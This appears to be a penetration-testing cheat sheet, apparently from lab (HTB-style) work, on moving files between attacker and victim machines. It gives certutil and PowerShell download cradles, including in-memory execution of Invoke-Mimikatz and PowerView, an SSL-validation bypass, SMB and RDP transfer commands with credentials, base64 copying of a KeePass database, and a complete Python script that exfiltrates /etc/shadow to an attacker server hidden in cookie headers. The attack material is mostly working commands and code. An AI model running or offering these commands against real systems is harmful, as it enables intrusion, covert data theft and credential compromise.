

## Curl
![Pasted image 20220807171324](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b6e6de4a-cba9-40e0-ae36-609dac78af18)

## wget

![Pasted image 20220807171312](https://github.com/dbissell6/Shadow_Stone/assets/50979196/c6f33b8e-9620-4ce9-9ea0-853344b41170)

### Get a files from a folder
```
wget -r -np http://10.10.14.98
```

## From Attack to Windows




### windows without curl or wget can use
```
certutil.exe -urlcache -f http://10.10.16.3:9999/winPEASany.exe winPEASany.exe
```

### Powershell download
```
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```
Following code will execute in memory
```
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
```

### Bypass common errors
Parsing error
```
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

SSL/TLS secure channel
```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


# ssh/scp

Local to Remote

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/cf6142e3-11ca-4f7d-89ee-b18a2ab38ac8)

Remote to Local

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/f183cb25-5143-4896-a101-d4b29ee8c273)


### smb with username + pass
attack
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
victim
```
net use n: \\192.168.220.133\share /user:test test
```
### Mount linux folder with rdp

<img width="704" alt="Screen Shot 2022-09-06 at 5 49 22 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/01e8ecf4-156e-4408-b83c-c4b6e12f3407">


```
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
### Using nc

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/94b2098c-8733-4757-a4bf-aa8be6ffc7a8)


![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/07c2968c-dba2-4728-bbe9-61a07ceadd97)


## Windows hash
To ensure integrity
```
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```
## From Windows to Attack

### ftp

<img width="963" alt="Screen Shot 2022-09-02 at 12 34 22 AM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/e38bbf4b-44bd-49eb-a5e6-6f370d06d173">

### smb
<img width="705" alt="Screen Shot 2022-08-06 at 1 39 31 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/fe5bd0db-eade-4b57-8c5b-d4a74bf27fe5">

<img width="402" alt="Screen Shot 2022-08-06 at 1 40 50 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/affb4d0d-10ef-47c4-971e-295187252f02">


### evilwinrm


<img width="795" alt="Screen Shot 2022-09-21 at 5 35 36 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/b16faa23-032d-47e7-bbad-8a68e7b8c0e0">



### Sometimes the easiest solution is to base64 encode and copy paste
`[convert]::ToBase64String((Get-Content -path "\Users\johanna\Documents\Logins.kdbx" -Encoding byte))`



## Covert Data Exfiltration

Exfiltrates file as cookies in a http web request

```
import base64
import requests

# Path to the file to exfiltrate (e.g., /etc/shadow)
file_path = "shadow"

# Attacker's URL (replace with your malicious server)
attacker_url = "http://10.0.0.10:80/"

# Read and encode the file in Base64
with open(file_path, "rb") as f:
    file_data = f.read()
    encoded_data = base64.b64encode(file_data).decode()

# Function to split data into chunks (suitable for cookie size)
def chunk_data(data, chunk_size=25):
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

# Split the Base64 encoded data into smaller chunks for the Cookie header
data_chunks = chunk_data(encoded_data)

# Send each chunk as part of the Cookie header in a fake request
for i, chunk in enumerate(data_chunks):
    # Set the cookie with the chunked data
    cookies = {
        f'Session': chunk  # Cookies should be a dictionary
    }

    # Send the fake HTTP GET request with the data in the Cookie header
    try:
        response = requests.get(attacker_url, cookies=cookies)
        if response.status_code == 200:
            print(f"Successfully sent chunk {i+1}/{len(data_chunks)}")
        else:
            print(f"Failed to send chunk {i+1}: Status Code {response.status_code}")
    except Exception as e:
        print(f"Error sending chunk {i+1}: {e}")

```

